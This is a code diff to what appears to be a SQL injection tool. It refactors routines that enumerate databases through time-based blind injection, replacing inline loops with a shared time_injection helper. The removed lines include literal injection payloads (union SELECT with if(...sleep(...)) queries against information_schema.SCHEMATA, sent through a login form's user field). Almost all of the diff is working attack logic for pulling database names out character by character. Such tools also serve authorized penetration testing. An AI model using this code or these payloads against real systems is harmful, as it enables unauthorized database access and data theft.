@@ -5,6 +5,7 @@ from lib.log import logger
 from test import SqliTest
 from tqdm import trange
 from lib.dealpayload import build_injection
+from lib.dealpayload import time_injection
 
 __author__ = "LoRexxar"
 
@@ -121,15 +122,11 @@ class SqliDatabases(SqliTest):
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start database amount sqli...")
 
-                for i in trange(100, desc='Database amount sqli', leave=False):
-                    # 先注databases的数量
-                    # payload = "user=admi' union  SELECT 1,if((SELECT COUNT(SCHEMA_NAME) from information_schema.SCHEMATA limit 0,1) > " + repr(
-                    #     i) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
-                    payload = self.dealpayload.construct_time_payload(select="COUNT(SCHEMA_NAME)",
-                                                                      source="information_schema.SCHEMATA", compare=i)
-                    if self.Data.GetTimeData(payload, self.time) == 0:
-                        databases_number = i
-                        break
+                retVal = time_injection(select="COUNT(SCHEMA_NAME)",
+                                        source="information_schema.SCHEMATA",
+                                        dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                        isCount=True, sqlirequest=self.sqlirequest)
+                databases_number = int(retVal)
 
                 logger.debug("Databases amount sqli success...The databases_number is %d..." % databases_number)
                 logger.info("[*] databases_number: %d" % databases_number)
@@ -138,19 +135,13 @@ class SqliDatabases(SqliTest):
                     logger.debug("Start %dth database length sqli..." % (i + 1))
 
                     # 然后注databases_name 的 length
-                    for j in trange(50, desc="%dth Database length sqli..." % (i + 1), leave=False):
-                        # payload = "user=ddog' union  SELECT 1,if((SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
-                        #     i) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
-                        payload = self.dealpayload.construct_time_payload(select="length(SCHEMA_NAME)",
-                                                                          source="information_schema.SCHEMATA",
-                                                                          limit=i,
-                                                                          compare=j)
-                        if self.Data.GetTimeData(payload, self.time) == 0:
-                            databases_name_len = j
-                            break
-                        elif j == 50:
-                            logger.error("Database length > 50...")
-                            databases_name_len = 50
+
+                    retVal = time_injection(select="length(SCHEMA_NAME)",
+                                            source="information_schema.SCHEMATA",
+                                            limit=i,
+                                            dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                            isCount=True, sqlirequest=self.sqlirequest)
+                    databases_name_len = int(retVal)
 
                     logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
                     logger.info("[*] %dth databases_name_len: %d" % ((i + 1), databases_name_len))
@@ -161,19 +152,12 @@ class SqliDatabases(SqliTest):
                     logger.debug("Start %dth database sqli..." % (i + 1))
 
                     for j in trange(int(databases_name_len), desc='%dth Database sqli' % (i + 1), leave=False):
-                        for k in trange(100, desc='%dth Database\'s %dth char sqli' % ((i + 1), (j + 1)), leave=False):
-                            # payload = "user=admi' union SELECT 1,if((SELECT  ascii(substring(SCHEMA_NAME," + repr(
-                            #     j + 1) + ",1)) from information_schema.SCHEMATA limit " + repr(
-                            #     i) + ",1) > " + repr(k + 30) + ",sleep(" + repr(
-                            #     self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
-                            payload = self.dealpayload.construct_time_payload(
-                                select="ascii(substring(SCHEMA_NAME," + repr(j + 1) + ",1))",
-                                source="information_schema.SCHEMATA",
-                                limit=i,
-                                compare=(k + 30))
-                            if self.Data.GetTimeData(payload, self.time) == 0:
-                                databases_name += chr(int(k + 30))
-                                break
+                        retVal = time_injection(select="ascii(substring(SCHEMA_NAME," + repr(j + 1) + ",1))",
+                                                source="information_schema.SCHEMATA",
+                                                limit=i,
+                                                dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                                isStrings=True, sqlirequest=self.sqlirequest)
+                        databases_name += chr(retVal)
 
                     logger.debug(
                         "%dth Databases name sqli success...The databases_name is %s..." % ((i + 1), databases_name))
@@ -292,16 +276,11 @@ class SqliDatabases(SqliTest):
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start database amount sqli...")
 
-                for i in trange(100, desc='Database amount sqli', leave=False):
-                    # 先注databases的数量
-                    # payload = {
-                    #     "user": "admi' union SELECT 1,if((SELECT COUNT(SCHEMA_NAME) from information_schema.SCHEMATA limit 0,1) > " + repr(
-                    #         i) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
-                    payload = self.dealpayload.construct_time_payload(select="COUNT(SCHEMA_NAME)",
-                                                                      source="information_schema.SCHEMATA", compare=i)
-                    if self.Data.PostTimeData(payload, self.time) == 0:
-                        databases_number = i
-                        break
+                retVal = time_injection(select="COUNT(SCHEMA_NAME)",
+                                        source="information_schema.SCHEMATA",
+                                        dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                        isCount=True, sqlirequest=self.sqlirequest)
+                databases_number = int(retVal)
 
                 logger.debug("Databases amount sqli success...The databases_number is %d..." % databases_number)
                 logger.info("[*] databases_number: %d" % databases_number)
@@ -310,20 +289,13 @@ class SqliDatabases(SqliTest):
                     # 然后注databases_number 的length
 
                     logger.debug("Start %dth database length sqli..." % (i + 1))
-                    for j in trange(50, desc="%dth Database length sqli..." % (i + 1), leave=False):
-                        # payload = {
-                        #     "user": "admi' union SELECT 1,if((SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
-                        #         i) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
-                        payload = self.dealpayload.construct_time_payload(select="length(SCHEMA_NAME)",
-                                                                          source="information_schema.SCHEMATA",
-                                                                          limit=i,
-                                                                          compare=j)
-                        if self.Data.PostTimeData(payload, self.time) == 0:
-                            databases_name_len = j
-                            break
-                        elif j == 50:
-                            logger.error("Database length > 50...")
-                            databases_name_len = 50
+
+                    retVal = time_injection(select="length(SCHEMA_NAME)",
+                                            source="information_schema.SCHEMATA",
+                                            limit=i,
+                                            dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                            isCount=True, sqlirequest=self.sqlirequest)
+                    databases_name_len = int(retVal)
 
                     logger.debug("%dth Databases name length sqli success...The databases_name_len is %d..." % ((i + 1), databases_name_len))
                     logger.info("[*] %dth databases_name_len: %d" % ((i + 1), databases_name_len))
@@ -334,18 +306,12 @@ class SqliDatabases(SqliTest):
                     logger.debug("Start %dth database sqli..." % (i + 1))
 
                     for j in trange(int(databases_name_len), desc='%dth Database sqli' % (i + 1), leave=False):
-                        for k in trange(100, desc='%dth Database\'s %dth char sqli' % ((i + 1), (j + 1)), leave=False):
-                            # payload = {"user": "admi' union SELECT 1,if((SELECT  ascii(substring(SCHEMA_NAME," + repr(
-                            #     j + 1) + ",1)) from information_schema.SCHEMATA limit " + repr(
-                            #     i) + ",1) > " + repr(k) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
-                            payload = self.dealpayload.construct_time_payload(
-                                select="ascii(substring(SCHEMA_NAME," + repr(j + 1) + ",1))",
-                                source="information_schema.SCHEMATA",
-                                limit=i,
-                                compare=(k + 30))
-                            if self.Data.PostTimeData(payload, self.time) == 0:
-                                databases_name += chr(int(k))
-                                break
+                        retVal = time_injection(select="ascii(substring(SCHEMA_NAME," + repr(j + 1) + ",1))",
+                                                source="information_schema.SCHEMATA",
+                                                limit=i,
+                                                dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                                isStrings=True, sqlirequest=self.sqlirequest)
+                        databases_name += chr(retVal)
 
                     logger.debug("%dth Databases name sqli success...The databases_name is %s..." % (
                         (i + 1), databases_name))
